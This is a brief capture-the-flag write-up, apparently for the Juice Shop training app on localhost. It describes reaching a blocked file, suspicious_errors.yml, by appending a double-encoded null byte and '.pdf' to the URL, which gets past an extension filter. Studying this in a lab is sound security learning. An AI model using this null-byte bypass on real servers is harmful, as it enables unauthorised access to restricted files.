Revisiting the url : http://localhost:3000/ftp/
we see an interesting file : http://localhost:3000/ftp/suspicious_errors.yml

upon trying to access it we are shown an 403 Error: Only .md and .pdf files are allowed!

this can be bypassed by null byte injection (%00)

http://localhost:3000/ftp/suspicious_errors.yml%2500.pdf
(%2500) %25 to encode %,

doing so successfully solved the challenge
